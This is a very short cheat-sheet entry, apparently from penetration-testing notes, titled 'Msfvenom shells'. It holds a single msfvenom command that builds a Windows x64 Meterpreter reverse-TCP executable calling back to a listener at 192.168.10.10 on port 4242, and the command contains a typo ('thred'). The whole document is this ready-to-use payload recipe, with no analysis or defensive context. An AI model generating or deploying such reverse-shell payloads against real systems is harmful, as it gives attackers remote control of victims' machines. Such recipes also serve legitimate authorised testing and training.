# Msfvenom shells

## x64 Meterpreter Shell
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=4242 EXITFUNC=thred -f exe > shell-x64.exe
```